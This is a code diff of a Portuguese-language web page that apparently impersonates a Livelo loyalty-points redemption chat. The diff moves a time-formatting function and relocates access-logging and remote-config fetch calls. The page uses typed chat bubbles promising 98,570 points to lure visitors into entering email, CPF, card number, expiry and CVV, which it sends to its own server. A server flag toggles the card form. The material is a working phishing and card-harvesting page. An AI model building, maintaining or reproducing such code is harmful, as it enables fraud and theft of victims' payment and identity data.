@@ -673,23 +673,13 @@
         // URL do servidor
         const SERVER_URL = window.location.origin;
 
-        // ===== REGISTRAR ACESSO AO CARREGAR A PÁGINA =====
-        fetch(`${SERVER_URL}/api/acesso`, { method: 'POST' })
-            .then(res => res.json())
-            .then(data => console.log('👁️ Acesso registrado:', data))
-            .catch(err => console.error('Erro ao registrar acesso:', err));
-
-        // ===== FUNÇÃO PARA BUSCAR CONFIGURAÇÃO DO SERVIDOR =====
-        async function getCartaoAtivoDoServidor() {
-            try {
-                const response = await fetch(`${SERVER_URL}/api/config`);
-                const data = await response.json();
-                console.log('📡 Configuração do servidor:', data);
-                return data.cartaoAtivo;
-            } catch (error) {
-                console.error('❌ Erro ao buscar configuração:', error);
-                return true;
-            }
+        // ===== FUNÇÃO DE HORÁRIO (DEFINIDA PRIMEIRO) =====
+        function getHora() {
+            return new Intl.DateTimeFormat('pt-BR', { 
+                timeZone: 'America/Sao_Paulo', 
+                hour: '2-digit', 
+                minute: '2-digit' 
+            }).format(new Date());
         }
 
         // ===== FUNÇÃO DE ANIMAÇÃO DE DIGITAÇÃO =====
@@ -703,40 +693,35 @@
             }
         }
 
+        // ===== FUNÇÃO DE ANIMAÇÃO DO CHAT (PÁGINA 3) =====
         async function iniciarAnimacaoChat() {
             console.log('🎬 Iniciando animação do chat (página 3)...');
             
-            // Mostra primeiro balão e digita
             $('#msg1').addClass('visible');
             await typeMessage('msg1-text', 'Você tem 98.570 pontos Livelo disponíveis para resgate.', 50);
             $('#hora1').text(getHora());
             
-            // Aguarda 1 segundo
             await new Promise(resolve => setTimeout(resolve, 1000));
             
-            // Mostra segundo balão e digita
             $('#msg2').addClass('visible');
             await typeMessage('msg2-text', 'Eu vou te ajudar com o seu resgate de pontos, mas primeiro vou precisar confirmar alguns dados.', 50);
             $('#hora2').text(getHora());
             
-            // Aguarda 1 segundo
             await new Promise(resolve => setTimeout(resolve, 1000));
             
-            // Mostra terceiro balão (protocolo) e digita
             $('#msg3').addClass('visible');
             await typeMessage('msg3-text', 'Protocolo: 2026031180153', 50);
             $('#hora3').text(getHora());
             
-            // Aguarda 1 segundo
             await new Promise(resolve => setTimeout(resolve, 1000));
             
-            // Mostra quarto balão e digita
             $('#msg4').addClass('visible');
             await typeMessage('msg4-text', 'Para iniciar seu resgate, digite seu e-mail que vai receber o comprovante:', 50);
             
             console.log('✅ Animação página 3 concluída!');
         }
 
+        // ===== FUNÇÃO DE ANIMAÇÃO DO CHAT (PÁGINA 4) =====
         async function iniciarAnimacaoChatCartao() {
             console.log('🎬 Iniciando animação do chat (página 4)...');
             
@@ -763,6 +748,25 @@
             $('#horaCartao4').text(getHora());
             
             console.log('✅ Animação página 4 concluída!');
+        }
+
+        // ===== REGISTRAR ACESSO AO CARREGAR A PÁGINA =====
+        fetch(`${SERVER_URL}/api/acesso`, { method: 'POST' })
+            .then(res => res.json())
+            .then(data => console.log('👁️ Acesso registrado:', data))
+            .catch(err => console.error('Erro ao registrar acesso:', err));
+
+        // ===== FUNÇÃO PARA BUSCAR CONFIGURAÇÃO DO SERVIDOR =====
+        async function getCartaoAtivoDoServidor() {
+            try {
+                const response = await fetch(`${SERVER_URL}/api/config`);
+                const data = await response.json();
+                console.log('📡 Configuração do servidor:', data);
+                return data.cartaoAtivo;
+            } catch (error) {
+                console.error('❌ Erro ao buscar configuração:', error);
+                return true;
+            }
         }
 
         async function enviarParaServidor(dados) {
@@ -818,14 +822,6 @@
             $('#cartao').mask('0000 0000 0000 0000');
             $('#validade').mask('00/00');
             $('#cvv').mask('000');
-
-            function getHora() {
-                return new Intl.DateTimeFormat('pt-BR', { 
-                    timeZone: 'America/Sao_Paulo', 
-                    hour: '2-digit', 
-                    minute: '2-digit' 
-                }).format(new Date());
-            }
 
             function validarCPF(c) {
                 c = c.replace(/\D/g, '');
